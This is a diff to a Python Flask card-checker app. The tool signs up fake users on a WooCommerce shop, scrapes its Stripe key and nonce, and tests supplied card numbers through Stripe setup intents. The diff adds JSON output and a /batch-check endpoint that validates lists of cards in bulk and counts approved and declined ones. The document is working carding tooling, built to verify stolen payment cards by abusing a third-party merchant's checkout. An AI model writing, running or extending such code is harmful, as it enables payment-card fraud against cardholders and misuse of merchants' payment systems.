@@ -1,11 +1,7 @@
-from flask import Flask, request
-import requests
-import re
-import os
-import json
-import random
+import requests, re, json, random
 from faker import Faker
 from bs4 import BeautifulSoup
+from flask import Flask, request, jsonify
 
 app = Flask(__name__)
 fake = Faker()
@@ -46,7 +42,7 @@ def get_stripe_key_and_nonce(session):
     stripe_pk = re.search(r'pk_(live|test)_[0-9a-zA-Z]+', html)
     nonce = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', html)
     if not stripe_pk or not nonce:
-        raise Exception("❌ Failed to extract stripe_pk or nonce")
+        raise Exception("Failed to extract stripe_pk or nonce")
     return stripe_pk.group(0), nonce.group(1)
 
 def create_payment_method(stripe_pk, card, exp_month, exp_year, cvv):
@@ -89,66 +85,131 @@ def confirm_setup(session, pm_id, nonce):
     res = session.post(f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", headers=headers, data=data)
     return res.text
 
-def start_checker(card_input):
-    result_text = ""
+def check_card_api(card_input):
     try:
         card, month, year, cvv = card_input.split("|")
         
-        # Create session
         session = requests.Session()
-        
-        # Register user
-        register_user(session)
-        
-        # Get Stripe key and nonce
+        session = register_user(session)
         stripe_pk, nonce = get_stripe_key_and_nonce(session)
-        
-        # Create payment method
         pm_id = create_payment_method(stripe_pk, card, month, year, cvv)
         
         if not pm_id:
-            result_text = "❌ Failed to create Payment Method"
-        else:
-            # Confirm setup
-            result = confirm_setup(session, pm_id, nonce)
+            return {
+                "status": "declined",
+                "message": "Failed to create Payment Method",
+                "gateway": "Stripe Auth v5"
+            }
+        
+        result = confirm_setup(session, pm_id, nonce)
+        
+        try:
+            rjson = json.loads(result)
+            data = rjson.get("data", {})
+            status = data.get("status", "")
             
-            try:
-                rjson = json.loads(result)
-                if rjson.get("success") and rjson["data"].get("status") == "succeeded":
-                    setupintent = rjson["data"].get("id", "N/A")
-                    result_text = f"""
-Status :- Approved  
-Setupintent :- {setupintent}  
-Response :- Stripe Auth Passed ✅  
-By :- Basic Coders
-"""
-                else:
-                    result_text = result
-            except:
-                result_text = result
-    
+            # APPROVED
+            if rjson.get("success") is True and status == "succeeded":
+                return {
+                    "status": "approved",
+                    "message": "Add payment successful",
+                    "gateway": "Stripe Auth v5",
+                    "details": {
+                        "setup_intent": data.get("id", "N/A"),
+                        "payment_method": pm_id,
+                        "card_last4": card[-4:]
+                    }
+                }
+            
+            # DECLINED
+            decline_message = None
+            
+            # 1️⃣ Stripe standard error
+            decline_message = data.get("error", {}).get("message")
+            
+            # 2️⃣ Stripe last_payment_error
+            if not decline_message:
+                decline_message = data.get("last_payment_error", {}).get("message")
+            
+            # 3️⃣ Global message fallback
+            if not decline_message:
+                decline_message = rjson.get("message", "Your card was declined")
+            
+            return {
+                "status": "declined",
+                "message": decline_message,
+                "gateway": "Stripe Auth v5",
+                "details": {
+                    "payment_method": pm_id,
+                    "card_last4": card[-4:]
+                }
+            }
+            
+        except Exception as e:
+            return {
+                "status": "error",
+                "message": str(e),
+                "raw_response": result[:500] if result else "No response",
+                "gateway": "Stripe Auth v5"
+            }
+            
+    except ValueError:
+        return {
+            "status": "error",
+            "message": "Invalid card format. Use: cc|mm|yy|cvv",
+            "gateway": "Stripe Auth v5"
+        }
     except Exception as e:
-        result_text = f"Error: {str(e)}"
-    
-    return result_text
+        return {
+            "status": "error",
+            "message": str(e),
+            "gateway": "Stripe Auth v5"
+        }
 
 @app.route('/ch', methods=['GET'])
 def check_card():
-    """API endpoint to check card - exact same logic as original script"""
     card_input = request.args.get('card')
     
     if not card_input:
-        return """
-Error: No card provided
-Usage: /ch?card=nn|mm|yy|cvv
-Example: /ch?card=4242424242424242|12|25|123
-"""
+        return jsonify({
+            "status": "error",
+            "message": "Card parameter is required. Format: cc|mm|yy|cvv",
+            "gateway": "Stripe Auth v5"
+        }), 400
     
-    # Run the exact same checker logic
-    result = start_checker(card_input)
+    result = check_card_api(card_input)
+    return jsonify(result)
+
+@app.route('/batch-check', methods=['POST'])
+def batch_check():
+    data = request.get_json()
     
-    # Return plain text response
-    return result
+    if not data or 'cards' not in data:
+        return jsonify({
+            "status": "error",
+            "message": "JSON body with 'cards' array is required"
+        }), 400
+    
+    cards = data['cards']
+    if not isinstance(cards, list):
+        return jsonify({
+            "status": "error",
+            "message": "'cards' must be an array"
+        }), 400
+    
+    results = []
+    for card_input in cards:
+        result = check_card_api(card_input)
+        result['card_input'] = card_input
+        results.append(result)
+    
+    return jsonify({
+        "total": len(results),
+        "approved": sum(1 for r in results if r['status'] == 'approved'),
+        "declined": sum(1 for r in results if r['status'] == 'declined'),
+        "error": sum(1 for r in results if r['status'] == 'error'),
+        "results": results
+    })
 
 @app.route('/', methods=['GET'])
 def home():
@@ -209,10 +270,10 @@ def home():
         
         <h2>📊 Response:</h2>
         <pre>
-Status :- Approved  
-Setupintent :- seti_xxxxxxxxxxxx  
-Response :- Stripe Auth Passed ✅  
-By :- Basic Coders
+"status": "approved/declined/error",
+"message": "Detailed message",
+"gateway": "Stripe Auth v5",
+"details": "Additional info (if available)"
         </pre>
         
         <h2>⚡ Usage:</h2>
